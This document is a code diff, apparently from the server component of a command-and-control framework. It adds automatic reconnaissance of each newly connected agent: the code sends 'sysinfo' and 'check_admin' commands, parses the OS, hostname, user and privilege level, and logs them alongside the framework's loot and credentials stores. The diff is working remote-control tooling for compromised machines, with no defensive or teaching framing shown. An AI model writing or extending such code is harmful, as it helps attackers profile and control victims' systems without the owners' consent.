@@ -32,12 +32,49 @@ def _build_protocol(sock, encryption):
     return Protocol(sock)
 
 
+def _auto_recon(ctx, agent_id, registry, audit):
+    try:
+        ctx.protocol.send('sysinfo')
+        result = str(ctx.protocol.recv())
+        info = {}
+        for line in result.split('\n'):
+            line = line.strip()
+            if ':' in line:
+                key, val = line.split(':', 1)
+                key, val = key.strip().lower(), val.strip()
+                if 'operating system' in key:
+                    info['os'] = val
+                elif 'node name' in key:
+                    info['hostname'] = val
+                elif 'user' in key:
+                    info['user'] = val
+
+        ctx.protocol.send('check_admin')
+        info['privilege'] = str(ctx.protocol.recv()).replace('[+] ', '').replace('[-] ', '')
+
+        registry.update_info(agent_id, **info)
+        agent_info = registry.get(agent_id)
+        if agent_info:
+            label = agent_info.label.replace(':', '_').replace('/', '_').replace('\\', '_')
+            ctx.agent_label = label
+            print_colored(
+                f'[*] {agent_id} | {green(label)} | {cyan(info.get("os", "?"))} | {green(info.get("user", "?"))} | {yellow(info.get("privilege", "?"))}',
+                'cyan'
+            )
+        audit.log(agent_id, 'sysinfo (auto-recon)', result[:200])
+    except Exception:
+        pass
+
+
 def run_session(sock, ip, loot_dir, encryption=False):
     audit, loot, creds = _init_stores(loot_dir)
     protocol = _build_protocol(sock, encryption)
     registry = AgentRegistry()
     agent_id = registry.register(sock, ip)
     creds.log_session(agent_id, ip, connected=True)
+
+    ctx = None
+    router = build_server_router()
 
     try:
         ctx = ServerSessionContext(
@@ -47,7 +84,7 @@ def run_session(sock, ip, loot_dir, encryption=False):
             loot_dir=loot_dir,
             agent_id=agent_id,
         )
-        router = build_server_router()
+        _auto_recon(ctx, agent_id, registry, audit)
 
         commands = list(router._commands.keys())
 
@@ -96,8 +133,8 @@ def run_master_loop(loot_dir, encryption=False):
                 print(dim('  (no agents connected)'))
             else:
                 from server.ui.prompt import format_table
-                headers = ['ID', 'IP', 'Connected']
-                rows = [[info.agent_id, info.ip, str(info.connected_at)[:19]] for info in agents.values()]
+                headers = ['ID', 'Host', 'OS', 'User', 'Privilege']
+                rows = [[info.agent_id, info.hostname, info.os, info.user, info.privilege] for info in agents.values()]
                 print(format_table(headers, rows))
             continue
 
